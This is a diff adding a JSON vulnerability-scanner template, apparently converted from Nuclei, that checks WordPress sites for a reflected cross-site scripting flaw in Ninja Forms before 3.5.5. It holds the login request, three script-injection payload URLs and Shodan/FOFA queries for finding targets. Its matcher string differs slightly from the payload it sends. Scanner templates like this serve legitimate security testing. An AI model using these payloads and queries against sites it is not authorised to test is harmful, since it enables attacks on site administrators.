@@ -1,0 +1,313 @@
+{
+  "id": "ninja-forms-xss",
+  "name": "Ninja Forms \u003c 3.5.5 - Cross-Site Scripting",
+  "author": "ritikchaddha",
+  "severity": "MEDIUM",
+  "description": "The Ninja Forms WordPress plugin before 3.5.5 does not escape an URL before outputting it back in an attribute, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin\n",
+  "references": [
+    "https://wpscan.com/vulnerability/ba6fa3d6-e3f7-449a-bd78-d57c26a67aa6/"
+  ],
+  "tags": [
+    "cve2021",
+    "wp",
+    "wordpress",
+    "wp-plugin",
+    "ninja-forms",
+    "xss",
+    "authenticated"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "http(1) \u0026\u0026 http(2) \u0026\u0026 http(3)",
+  "searchQueries": {
+    "publicwww": "/wp-content/plugins/ninja-forms/",
+    "fofa": "body\u003d\"/wp-content/plugins/ninja-forms\"",
+    "shodan": "http.html:\"/wp-content/plugins/ninja-forms/\""
+  },
+  "variables": {
+    "path": [
+      "wp-admin/admin.php?page\u003dnf-settings\u0026\"\u003e\u003cscript\u003ealert(/document.domain/)\u003c/script\u003e",
+      "wp-admin/admin.php?page\u003dnf-import-export\u0026\"\u003e\u003cscript\u003ealert(/document.domain/)\u003c/script\u003e",
+      "wp-admin/edit.php?post_status\u003dall\u0026post_type\u003dnf_sub\u0026form_id\u003d1\u0026\"\u003e\u003cscript\u003ealert(/document.domain/)\u003c/script\u003e"
+    ]
+  },
+  "variablesType": "sniper",
+  "cweId": "CWE-79",
+  "cvssScore": "6.1",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET / HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body_1",
+          "values": [
+            "/wp-content/plugins/ninja-forms"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog\u003d{{username}}\u0026pwd\u003d{{password}}\u0026wp-submit\u003dLog+In\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "302"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_2",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /{{path}} HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\"\u003e\u003cscript\u003ealert(/document_domain/)\u003c/script\u003e"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "content_type",
+          "values": [
+            "text/html"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "ninja-forms-xss",
+    "info": {
+      "name": "Ninja Forms \u003c 3.5.5 - Cross-Site Scripting",
+      "author": "ritikchaddha",
+      "severity": "medium",
+      "description": "The Ninja Forms WordPress plugin before 3.5.5 does not escape an URL before outputting it back in an attribute, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin\n",
+      "reference": [
+        "https://wpscan.com/vulnerability/ba6fa3d6-e3f7-449a-bd78-d57c26a67aa6/"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "cvss_score": "6.1",
+        "cwe_id": "CWE-79"
+      },
+      "metadata": {
+        "max_request": 5,
+        "shodan_query": "http.html:\"/wp-content/plugins/ninja-forms/\"",
+        "fofa_query": "body\u003d\"/wp-content/plugins/ninja-forms\"",
+        "publicwww_query": "/wp-content/plugins/ninja-forms/"
+      },
+      "tags": "cve2021,wp,wordpress,wp-plugin,ninja-forms,xss,authenticated"
+    },
+    "flow": "http(1) \u0026\u0026 http(2) \u0026\u0026 http(3)",
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET / HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body_1",
+            "words": [
+              "/wp-content/plugins/ninja-forms"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog\u003d{{username}}\u0026pwd\u003d{{password}}\u0026wp-submit\u003dLog+In\n"
+        ],
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              302
+            ]
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "payloads": {
+          "path": [
+            "wp-admin/admin.php?page\u003dnf-settings\u0026\"\u003e\u003cscript\u003ealert(/document.domain/)\u003c/script\u003e",
+            "wp-admin/admin.php?page\u003dnf-import-export\u0026\"\u003e\u003cscript\u003ealert(/document.domain/)\u003c/script\u003e",
+            "wp-admin/edit.php?post_status\u003dall\u0026post_type\u003dnf_sub\u0026form_id\u003d1\u0026\"\u003e\u003cscript\u003ealert(/document.domain/)\u003c/script\u003e"
+          ]
+        },
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /{{path}} HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\"\u003e\u003cscript\u003ealert(/document_domain/)\u003c/script\u003e"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "content_type",
+            "words": [
+              "text/html"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
